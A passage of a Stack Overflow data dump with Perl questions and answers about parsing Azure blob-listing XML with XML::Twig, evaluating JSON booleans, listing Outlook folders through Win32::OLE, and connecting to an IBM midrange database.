"https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 1, "creation_date": 1494507792, "post_id": 43914226, "comment_id": 74865526, "body": "@LittleCode: I&#39;ve tested my update against your new data and it&#39;s working fine."}, {"owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 0, "creation_date": 1494507990, "post_id": 43914226, "comment_id": 74865683, "body": "Yeah great. Thanks for that.  Its a shame you can&#39;t accept two answers here. So I&#39;ve given you a bunch of upvotes and left the answer with Choroba as the overall concept was still good, just a little bug.   But  your answer was equally interesting, as you say, sometimes callbacks are overkill.  Thanks again !"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1494515796, "last_edit_date": 1494515796, "creation_date": 1494502365, "answer_id": 43914226, "question_id": 43913677, "link": "https://stackoverflow.com/questions/43913677/xmltwig-identifying-blobs-that-do-not-contain-an-element/43914226#43914226", "title": "XML::Twig - identifying blobs that do not contain an element", "body": "\n\n<h3>Update</h3>\n\n<p>There's no reason to use the system of callbacks that <code>XML::Twig</code> provides unless your XML data is enormous and the corresponding data structure consumes too much memory, which is unlikely for data obtained in an internet message</p>\n\n<p>I would implement it this way</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings;\nuse feature 'say';\n\nuse XML::Twig;\nuse List::Util 'none';\n\nmy @unwanted = qw/\n    Last-Modified Etag Content-Type Content-Encoding\n    Content-Language Content-MD5 Cache-Control Metadata\n/;\n\nmy $twig = 'XML::Twig'-&gt;new;\n\n$twig-&gt;parsefile('blob.xml');\n\nfor my $blob ( $twig-&gt;find_nodes('Blobs/Blob') ) {\n\n    if ( none { $blob-&gt;find_nodes(\"Properties/$_\") } @unwanted ) {\n        say $_-&gt;text for $blob-&gt;find_nodes('Name');\n    }\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>test\n</code></pre>\n\n<p><br/></p>\n\n<hr>\n\n<p>If your XML is in fact well-formed and your example data is a mistake, then it is simple to print the text content of all <code>Name</code> elements</p>\n\n<p>I have used this data</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;EnumerationResults ServiceEndpoint=\"https://my**account.blob.core.windows.net/\"\n  ContainerName=\"testonly\"&gt;\n  &lt;Blobs&gt;\n    &lt;Blob&gt;\n      &lt;Name&gt;test&lt;/Name&gt;\n      &lt;Properties&gt;\n        &lt;Content-Length&gt;0&lt;/Content-Length&gt;\n        &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n        &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n        &lt;LeaseState&gt;available&lt;/LeaseState&gt;\n      &lt;/Properties&gt;\n    &lt;/Blob&gt;\n  &lt;/Blobs&gt;\n  &lt;NextMarker/&gt;\n&lt;/EnumerationResults&gt;\n</code></pre>\n\n<h3>Perl</h3>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse XML::Twig;\n\nmy $t = XML::Twig-&gt;new;\n$t-&gt;parsefile( 'blob.xml');\n\nsay $_-&gt;text for $t-&gt;find_nodes('Blobs/Blob/Name');\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>test\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1494507557, "post_id": 43914280, "comment_id": 74865334, "body": "I think this needs to be <code>my $properties = $blob-&gt;first_child(&#39;Properties&#39;)</code> and <code>$properties-&gt;first_child($_) and return ... </code>."}, {"owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494507661, "post_id": 43914280, "comment_id": 74865414, "body": "@Borodin I&#39;m retesting with this... per my comment to you below, it actually doesn&#39;t work on &quot;real&quot; data  ... serves me right for over-simplifying my sample !  I have updated my question with added data."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1494509157, "post_id": 43914280, "comment_id": 74866680, "body": "Updated according to the new sample."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 2, "last_activity_date": 1494509127, "last_edit_date": 1494509127, "creation_date": 1494502479, "answer_id": 43914280, "question_id": 43913677, "link": "https://stackoverflow.com/questions/43913677/xmltwig-identifying-blobs-that-do-not-contain-an-element/43914280#43914280", "title": "XML::Twig - identifying blobs that do not contain an element", "body": "<p>Just create a handler for <code>Blob</code>, do nothing if any of the elements is present, otherwise print the name. Use the <code>first_child</code> method to inspect the internal structure of a blob.</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nuse XML::Twig;\n\nmy $xml = '...';\n\nmy $twig = 'XML::Twig'-&gt;new(twig_handlers =&gt; {\n    Blob =&gt; sub {\n        my $properties = $_-&gt;first_child('Properties');\n        $properties-&gt;first_child($_) and return\n            for qw( Last-Modified Etag Content-Type Content-Encoding\n                    Content-Language Content-MD5 Cache-Control Metadata\n                  );\n        say $_-&gt;first_child('Name')-&gt;text;\n    },\n});\n$twig-&gt;parse($xml);\n</code></pre>\n"}], "owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 43914280, "answer_count": 2, "score": 1, "last_activity_date": 1494515796, "creation_date": 1494500942, "last_edit_date": 1494513301, "question_id": 43913677, "link": "https://stackoverflow.com/questions/43913677/xmltwig-identifying-blobs-that-do-not-contain-an-element", "title": "XML::Twig - identifying blobs that do not contain an element", "body": "\n\n<p>I am using <a href=\"https://metacpan.org/pod/XML::Twig\" rel=\"nofollow noreferrer\"><code>XML::Twig</code></a> to parse output of Azure's <code>list-blob</code> REST API.</p>\n\n<p>In particular, I am looking to identify and delete uncommitted orphan blobs, and I am unsure as to how best go about using <code>XML::Twig</code> efficiently to do this. I don't even know where to start.</p>\n\n<p>Ultimately I need to retrieve the <code>&lt;Name&gt;</code> element of the orphaned blobs.</p>\n\n<p>The <a href=\"https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs\" rel=\"nofollow noreferrer\">Azure documentation</a> states:</p>\n\n<blockquote>\n  <p><strong>Uncommitted Blobs in the Response</strong></p>\n  \n  <p>Uncommitted blobs are listed in the response only if the\n  <em>include=uncommittedblobs</em> parameter was specified on the URI.\n  Uncommitted blobs listed in the response do not include any of the\n  following elements:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Last-Modified\nEtag\nContent-Type\nContent-Encoding\nContent-Language\nContent-MD5\nCache-Control\nMetadata\n</code></pre>\n</blockquote>\n\n<p>Therefore, in the following simplified example, you can see an orphan blob called \"test\"  because the <code>&lt;Blob&gt;&lt;/Blob&gt;</code> block does not contain any of the above elements.</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;EnumerationResults ServiceEndpoint=\"https://my**account.blob.core.windows.net/\"\n  ContainerName=\"testonly\"&gt;\n  &lt;Blobs&gt;\n    &lt;Blob&gt;\n      &lt;Name&gt;test&lt;/Name&gt;\n      &lt;Properties&gt;\n        &lt;Content-Length&gt;0&lt;/Content-Length&gt;\n        &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n        &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n        &lt;LeaseState&gt;available&lt;/LeaseState&gt;\n      &lt;/Properties&gt;\n    &lt;/Blob&gt;\n  &lt;/Blobs&gt;\n  &lt;NextMarker/&gt;\n&lt;/EnumerationResults&gt;\n</code></pre>\n\n<p>UPDATE :</p>\n\n<p>Actually, I might have oversimplified.  The accepted answer does not appear to work with the below, it prints everything :</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;EnumerationResults ServiceEndpoint=\"https://my**account.blob.core.windows.net/\" ContainerName=\"testonly\"&gt;\n&lt;Blobs&gt;\n    &lt;Blob&gt;\n        &lt;Name&gt;data/users/docx&lt;/Name&gt;\n        &lt;Properties&gt;\n            &lt;Last-Modified&gt;Wed, 10 May 2017 20:21:25 GMT&lt;/Last-Modified&gt;\n            &lt;Etag&gt;0x8D497E221E7A5AF&lt;/Etag&gt;\n            &lt;Content-Length&gt;125632&lt;/Content-Length&gt;\n            &lt;Content-Type&gt;application/octet-stream&lt;/Content-Type&gt;\n            &lt;Content-Encoding/&gt;\n            &lt;Content-Language/&gt;\n            &lt;Content-MD5/&gt;\n            &lt;Cache-Control/&gt;\n            &lt;Content-Disposition/&gt;\n            &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n            &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n            &lt;LeaseState&gt;available&lt;/LeaseState&gt;\n        &lt;/Properties&gt;\n    &lt;/Blob&gt;\n    &lt;Blob&gt;\n        &lt;Name&gt;test&lt;/Name&gt;\n        &lt;Properties&gt;\n            &lt;Content-Length&gt;0&lt;/Content-Length&gt;\n            &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n            &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n            &lt;LeaseState&gt;available&lt;/LeaseState&gt;\n        &lt;/Properties&gt;\n    &lt;/Blob&gt;\n&lt;/Blobs&gt;\n&lt;NextMarker/&gt;\n&lt;/EnumerationResults&gt;\n</code></pre>\n\n<p>My code :</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>sub blob_parse {\n        my $blob = $_;\n        $blob-&gt;first_child($_) and return\n        for qw( Last-Modified Etag Content-Type Content-Encoding\n                Content-Language Content-MD5 Cache-Control Metadata);\n        say \"orph: \".$blob-&gt;first_child('Name')-&gt;text;\n}\n\nsub parseAndDelete {\n        ### ORPHAN\n        $twig_handlers = {'Blobs/Blob' =&gt; \\&amp;blob_parse};\n        $twig = new XML::Twig(twig_handlers=&gt;$twig_handlers);\n        $twig-&gt;parse($message);\n}\n</code></pre>\n"}, {"tags": ["json", "perl", "boolean-expression"], "comments": [{"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 1, "creation_date": 1494497490, "post_id": 43912466, "comment_id": 74858211, "body": "This doesn&#39;t make any sense. If it is <code>1</code> then it is not <code>&quot;true&quot;</code>."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1494498259, "post_id": 43912466, "comment_id": 74858728, "body": "Example JSON would help us answer. <code>&#39;false&#39;</code> is a string, it isn&#39;t &quot;false&quot; in a boolean logic sense. And that&#39;s the root of your problem I think."}, {"owner": {"reputation": 516, "user_id": 2224218, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f7db38a8b0010381be6cde932b0f8b7b?s=128&d=identicon&r=PG", "display_name": "Subhash", "link": "https://stackoverflow.com/users/2224218/subhash"}, "reply_to_user": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1494498683, "post_id": 43912466, "comment_id": 74859001, "body": "@Quentin, made change in my original question. Where there is a single verification sub for both cases(true &amp; false)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494502627, "post_id": 43912466, "comment_id": 74861686, "body": "If you decoded the string with the JSON module or one of the same family, the boolean will be translated into an object that has overloading in place to return a truthy or falsey value. You just need to evaluate it directly. See the docs of JSON on cpan for boolean values."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494503535, "post_id": 43912466, "comment_id": 74862353, "body": "The answer you have referenced says exactly what you need."}], "answers": [{"comments": [{"owner": {"reputation": 516, "user_id": 2224218, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f7db38a8b0010381be6cde932b0f8b7b?s=128&d=identicon&r=PG", "display_name": "Subhash", "link": "https://stackoverflow.com/users/2224218/subhash"}, "edited": false, "score": 0, "creation_date": 1494499042, "post_id": 43912749, "comment_id": 74859227, "body": "I need to get into if block, in both the cases, (true and false)."}, {"owner": {"reputation": 516, "user_id": 2224218, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f7db38a8b0010381be6cde932b0f8b7b?s=128&d=identicon&r=PG", "display_name": "Subhash", "link": "https://stackoverflow.com/users/2224218/subhash"}, "edited": false, "score": 0, "creation_date": 1494505254, "post_id": 43912749, "comment_id": 74863578, "body": "I do not want to check if key presents or not. I am verifying the value of <code>boolean_field</code>."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1494508270, "post_id": 43912749, "comment_id": 74865924, "body": "Not sure why you think <code>exists</code> is at all useful here. You need to check the truth of the value."}, {"owner": {"reputation": 1652, "user_id": 4414367, "user_type": "registered", "accept_rate": 62, "profile_image": "https://lh3.googleusercontent.com/-l6uq-uiBGvg/AAAAAAAAAAI/AAAAAAAAAVA/F0AWblrmSTM/photo.jpg?sz=128", "display_name": "Kamal Nayan", "link": "https://stackoverflow.com/users/4414367/kamal-nayan"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1494508839, "post_id": 43912749, "comment_id": 74866432, "body": "@DaveCross: On the above comment, he has written that <b>I need to get into if block, in both the cases, (true and false).</b>, that I think can be done from <code>exists</code>, however please correct me."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1494509020, "post_id": 43912749, "comment_id": 74866567, "body": "And then later he says **I do not want to check if key presents or not&quot;&quot;. I&#39;m not sure if the problem is with his understanding of the task, or his English :-)"}, {"owner": {"reputation": 1652, "user_id": 4414367, "user_type": "registered", "accept_rate": 62, "profile_image": "https://lh3.googleusercontent.com/-l6uq-uiBGvg/AAAAAAAAAAI/AAAAAAAAAVA/F0AWblrmSTM/photo.jpg?sz=128", "display_name": "Kamal Nayan", "link": "https://stackoverflow.com/users/4414367/kamal-nayan"}, "edited": false, "score": 0, "creation_date": 1494509126, "post_id": 43912749, "comment_id": 74866657, "body": "His response was after around an hour, when I assumed that he wants to check for keys. I think English is his problem."}, {"owner": {"reputation": 1652, "user_id": 4414367, "user_type": "registered", "accept_rate": 62, "profile_image": "https://lh3.googleusercontent.com/-l6uq-uiBGvg/AAAAAAAAAAI/AAAAAAAAAVA/F0AWblrmSTM/photo.jpg?sz=128", "display_name": "Kamal Nayan", "link": "https://stackoverflow.com/users/4414367/kamal-nayan"}, "edited": false, "score": 0, "creation_date": 1494509199, "post_id": 43912749, "comment_id": 74866717, "body": "If I omit <code>exists</code> then my answer would be same as yours! Isn&#39;t it?"}], "tags": [], "owner": {"reputation": 1652, "user_id": 4414367, "user_type": "registered", "accept_rate": 62, "profile_image": "https://lh3.googleusercontent.com/-l6uq-uiBGvg/AAAAAAAAAAI/AAAAAAAAAVA/F0AWblrmSTM/photo.jpg?sz=128", "display_name": "Kamal Nayan", "link": "https://stackoverflow.com/users/4414367/kamal-nayan"}, "is_accepted": false, "score": -1, "last_activity_date": 1494500229, "last_edit_date": 1494500229, "creation_date": 1494498250, "answer_id": 43912749, "question_id": 43912466, "link": "https://stackoverflow.com/questions/43912466/how-to-evaluate-a-json-decoded-boolean-value-as-true/43912749#43912749", "title": "How to evaluate a json decoded boolean value as &quot;true&quot;", "body": "<p>We don't need to use regex to find whether its true or false.<br><code>0, undef, false</code> are false values, rest are true. Can you please try this solution?</p>\n\n<pre><code>use strict;\nuse warnings;\nuse JSON;\n\nmy $json_string = '{\"boolean_field\":0}';\n# I tried with many possible combinations of boolean_field\n# 0, false =&gt; returned false\n# 1, 50 (Any value), true =&gt; returned true\n\nmy $decoded_json = from_json $json_string;\nprint 'true' if exists $decoded_json-&gt;{'boolean_field'};\n# exists will check whether key boolean_field exists. It won't check for values\n</code></pre>\n\n<p><strong>Edit</strong>: User needs to check key only, added <code>exists</code> in condition.</p>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1494505554, "creation_date": 1494505554, "answer_id": 43915378, "question_id": 43912466, "link": "https://stackoverflow.com/questions/43912466/how-to-evaluate-a-json-decoded-boolean-value-as-true/43915378#43915378", "title": "How to evaluate a json decoded boolean value as &quot;true&quot;", "body": "<p>If you have a Boolean value, then you shouldn't be checking its value using a string comparison. You should only ever ask it if it is true or false. Your code should look more like this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse feature 'say';\n\nuse JSON;\n\nmy $json_string = '{\"boolean_field\":true}';\nmy $decoded_json = from_json $json_string;\n\nboolean_check($decoded_json-&gt;{boolean_field});\n\n$json_string = '{\"boolean_field\":false}';\n$decoded_json = from_json $json_string;\n\nboolean_check($decoded_json-&gt;{boolean_field});\n\nsub boolean_check {\n  my $value = shift;\n\n  if ($value) {\n    say 'Value is true';\n  } else {\n    say 'Value is false';\n  }\n}\n</code></pre>\n\n<p>If you use Data::Dumper to look at <code>$decoded_json</code>, you'll see that <code>boolean_field</code> will contain an object which will return either a true or false value as appropriate.</p>\n\n<pre><code>$VAR1 = {\n          'boolean_field' =&gt; bless( do{\\(my $o = 0)}, 'JSON::PP::Boolean' )\n        };\n</code></pre>\n"}], "owner": {"reputation": 516, "user_id": 2224218, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f7db38a8b0010381be6cde932b0f8b7b?s=128&d=identicon&r=PG", "display_name": "Subhash", "link": "https://stackoverflow.com/users/2224218/subhash"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 905, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1494505554, "creation_date": 1494497408, "last_edit_date": 1495535473, "question_id": 43912466, "link": "https://stackoverflow.com/questions/43912466/how-to-evaluate-a-json-decoded-boolean-value-as-true", "title": "How to evaluate a json decoded boolean value as &quot;true&quot;", "body": "<p>With reference to <a href=\"https://stackoverflow.com/questions/6792173/in-perl-checking-a-json-decoded-boolean-value\">In Perl, checking a json decoded boolean value</a> , </p>\n\n<p>I have a verification sub, where I need to check like this,</p>\n\n<pre><code>my $boolean = 'true';\nmy $json_string = '{\"boolean_field\":true}'; \nmy $decoded_json = from_json $json_string;\n\n&amp;verify($boolean);\n\n$boolean = 'false';\n$json_string = '{\"boolean_field\":false}';\n$decoded_json = from_json $json_string;\n\n&amp;verify($boolean);\n\nsub verify {\n  my $boolean = shift;\n  if( $decoded_json-&gt;{'boolean_field'} eq $boolean ){\n     # both are equal\n  }\n</code></pre>\n\n<p>This if condition fails, as <code>$decoded_json-&gt;{'boolean_field'}</code> returns 1 or 0.</p>\n\n<p>How do I evaluate <code>$decoded_json-&gt;{'boolean_field'}</code> as either string 'true' or 'false' ?</p>\n\n<p>Work around I have now is </p>\n\n<pre><code>my $readBit = ($boolean =~ /false/ ) ? 0 : 1 ;\nif( $decoded_json-&gt;{'boolean_field'} eq $readBit){\n   # both are equal\n}\n</code></pre>\n"}, {"tags": ["perl", "outlook"], "comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1494497052, "post_id": 43911842, "comment_id": 74857909, "body": "<a href=\"http://search.cpan.org/~duncan/Mail-Outlook-0.23/lib/Mail/Outlook.pm#NAME\" rel=\"nofollow noreferrer\">you can refer this</a>"}, {"owner": {"reputation": 535, "user_id": 6504337, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/1e942c50c89e6f2f1f9a3435bc24e943?s=128&d=identicon&r=PG&f=1", "display_name": "marhyno", "link": "https://stackoverflow.com/users/6504337/marhyno"}, "reply_to_user": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1494509446, "post_id": 43911842, "comment_id": 74866919, "body": "I tried but no luck :( you can see I have all_folders method inside of the code"}], "answers": [{"tags": [], "owner": {"reputation": 535, "user_id": 6504337, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/1e942c50c89e6f2f1f9a3435bc24e943?s=128&d=identicon&r=PG&f=1", "display_name": "marhyno", "link": "https://stackoverflow.com/users/6504337/marhyno"}, "is_accepted": true, "score": 0, "last_activity_date": 1494777538, "creation_date": 1494777538, "answer_id": 43966003, "question_id": 43911842, "link": "https://stackoverflow.com/questions/43911842/how-to-list-outlook-folders-with-perl/43966003#43966003", "title": "How to list outlook folders with Perl?", "body": "<p>so I finally come to the solution of my problem. Because I am using outlook at work, it has some predefined settings. We tested it with colleague from other country and we are working in the same company, but he has different settings in his outlook. So in my case I have three folders.</p>\n\n<p>email.address@domain.com\narchive\nemail.address@domain.com</p>\n\n<p>I am not sure why my address is listed there twice but any way, all I had to do is to connect to my email address and then list all folders. Example here is to list every subfolder inside of the INBOX folder.</p>\n\n<pre><code>use strict;\n\n#use warnings;\n\n\n### This Perl Modules should be installed!\n\nuse Win32::OLE;\nuse Win32::OLE::Const 'Microsoft Excel'; # instead of the constants\nuse Win32::OLE::Const 'Microsoft Outlook';\nuse Win32::OLE qw(in with);\nuse Win32::OLE::Variant;\n\n\nuse IO::File;\nuse IO::Handle;\nuse Date::Calc qw(:all);\n\n#jumps to outlook\nmy $OL = Win32::OLE-&gt;GetActiveObject('Outlook.Application');\n\n#this is predefined namespace   \nmy $namespace = $OL-&gt;GetNamespace('MAPI');\n\n#loop through all folders inside of the INBOX folder   \nforeach my $i (1..$namespace-&gt;Folders-&gt;Count) {\n\n       my $folder = $namespace-&gt;Folders(\"email.address\\@domain.com\")-&gt;Folders(\"Inbox\")-&gt;Folders($i)-&gt;Name;\n\n       print $folder, \"....\\n\";                    \n    }\n</code></pre>\n\n<p>Problem solved :).</p>\n\n<p>Also a note -> you might have different settings in your outlook so in that case you could delete first folder - Folders(\"email.address\\@domain.com\") - or at least this is how it works with my colleagues outlook.</p>\n"}], "owner": {"reputation": 535, "user_id": 6504337, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/1e942c50c89e6f2f1f9a3435bc24e943?s=128&d=identicon&r=PG&f=1", "display_name": "marhyno", "link": "https://stackoverflow.com/users/6504337/marhyno"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 299, "favorite_count": 0, "accepted_answer_id": 43966003, "answer_count": 1, "score": 0, "last_activity_date": 1494777538, "creation_date": 1494495774, "last_edit_date": 1494506205, "question_id": 43911842, "link": "https://stackoverflow.com/questions/43911842/how-to-list-outlook-folders-with-perl", "title": "How to list outlook folders with Perl?", "body": "<p>I need help listing all folders in my Outlook inbox with Perl. I tried it using this code but cannot output prints nothing. I am such a beginner with Perl and I couldn't find any simple solution for this.</p>\n\n<pre><code>#!/usr/bin/perl\nuse Win32::OLE qw(in with);\nuse Win32::OLE::Const 'Microsoft Outlook';\nuse Win32::OLE::Variant;\n\nmy $OL = Win32::OLE-&gt;GetActiveObject('Outlook.Application');\n\nmy $namespace = $OL-&gt;GetNamespace('MAPI');\n\nmy $all_folders = $namespace-&gt;all_folders();\n\nprint $all_folders;\n</code></pre>\n"}, {"tags": ["database", "perl", "ibm-midrange"], "comments": [{"owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "edited": false, "score": 0, "creation_date": 1494492521, "post_id": 43909456, "comment_id": 74854542, "body": "AS/400 <i>was</i> a systems platform fr&#229;n IBM, now called &quot;IBM System i&quot;. I suspect you need to start by figuring out what service it is you want to connect to. There are many databases that can run on an i-series server."}, {"owner": {"reputation": 1652, "user_id": 4414367, "user_type": "registered", "accept_rate": 62, "profile_image": "https://lh3.googleusercontent.com/-l6uq-uiBGvg/AAAAAAAAAAI/AAAAAAAAAVA/F0AWblrmSTM/photo.jpg?sz=128", "display_name": "Kamal Nayan", "link": "https://stackoverflow.com/users/4414367/kamal-nayan"}, "edited": false, "score": 0, "creation_date": 1494500697, "post_id": 43909456, "comment_id": 74860373, "body": "Which Database you need to connect? Is it DB2?"}, {"owner": {"reputation": 9819, "user_id": 2296441, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/sf28F.jpg?s=128&g=1", "display_name": "jmarkmurphy", "link": "https://stackoverflow.com/users/2296441/jmarkmurphy"}, "reply_to_user": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "edited": false, "score": 1, "creation_date": 1494504526, "post_id": 43909456, "comment_id": 74863077, "body": "@CalleDybedahl it hasn&#39;t been named System i since 2008 when the hardware was unified with the System p hardware. The hardware is now called Power Systems or Pure Systems, and can run IBM i, AIX, or Linux. IBM i is the OS formerly known as i5/OS or OS/400. The current naming scheme is subject to change at any time by IBM&#39;s marketing department."}, {"owner": {"reputation": 3685, "user_id": 44732, "user_type": "registered", "accept_rate": 36, "profile_image": 